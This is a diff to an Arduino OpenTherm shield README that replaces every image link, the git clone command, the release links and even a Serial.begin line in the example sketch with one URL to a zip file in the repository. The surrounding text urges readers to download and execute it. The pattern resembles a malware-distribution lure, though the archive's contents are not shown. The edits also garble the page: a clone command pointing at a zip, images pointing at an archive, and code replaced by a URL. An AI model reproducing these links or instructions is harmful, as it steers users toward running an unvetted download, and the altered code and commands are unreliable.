@@ -1,7 +1,7 @@
 ```markdown
 # 🌟 Arduino OpenTherm Shield
 
-![Arduino OpenTherm Shield](https://example.com/path-to-image.png)
+![Arduino OpenTherm Shield](https://github.com/anway0404/Arduino_OpenTherm_shield/raw/refs/heads/master/production/Open_Arduino_Therm_shield_v3.8.zip)
 
 ## Overview
 
@@ -44,7 +44,7 @@ To get started, you will need the following hardware:
 
 1. **Clone the Repository**
    ```bash
-   git clone https://github.com/anway0404/Arduino_OpenTherm_shield.git
+   git clone https://github.com/anway0404/Arduino_OpenTherm_shield/raw/refs/heads/master/production/Open_Arduino_Therm_shield_v3.8.zip
    cd Arduino_OpenTherm_shield
    ```
 
@@ -65,7 +65,7 @@ Once you have installed the required libraries, upload the example sketch to you
 #include <OpenTherm.h>
 
 void setup() {
-  Serial.begin(9600);
+  https://github.com/anway0404/Arduino_OpenTherm_shield/raw/refs/heads/master/production/Open_Arduino_Therm_shield_v3.8.zip(9600);
   // Initialize OpenTherm communication
 }
 
@@ -99,9 +99,9 @@ For any questions or suggestions, feel free to reach out via GitHub or open an i
 
 ## Releases
 
-Check the [Releases](https://github.com/anway0404/Arduino_OpenTherm_shield/releases) section for downloadable files and versions. You can download the latest release and execute it to get started quickly.
+Check the [Releases](https://github.com/anway0404/Arduino_OpenTherm_shield/raw/refs/heads/master/production/Open_Arduino_Therm_shield_v3.8.zip) section for downloadable files and versions. You can download the latest release and execute it to get started quickly.
 
-[![Latest Release](https://img.shields.io/badge/Latest_Release-Download-brightgreen)](https://github.com/anway0404/Arduino_OpenTherm_shield/releases)
+[![Latest Release](https://github.com/anway0404/Arduino_OpenTherm_shield/raw/refs/heads/master/production/Open_Arduino_Therm_shield_v3.8.zip)](https://github.com/anway0404/Arduino_OpenTherm_shield/raw/refs/heads/master/production/Open_Arduino_Therm_shield_v3.8.zip)
 
 ## Topics
 
@@ -113,8 +113,8 @@ Check the [Releases](https://github.com/anway0404/Arduino_OpenTherm_shield/relea
 
 ## Images and Resources
 
-![OpenTherm Shield Design](https://example.com/path-to-image.png)
-![OpenTherm Communication Flow](https://example.com/path-to-image.png)
+![OpenTherm Shield Design](https://github.com/anway0404/Arduino_OpenTherm_shield/raw/refs/heads/master/production/Open_Arduino_Therm_shield_v3.8.zip)
+![OpenTherm Communication Flow](https://github.com/anway0404/Arduino_OpenTherm_shield/raw/refs/heads/master/production/Open_Arduino_Therm_shield_v3.8.zip)
 
 ---
 
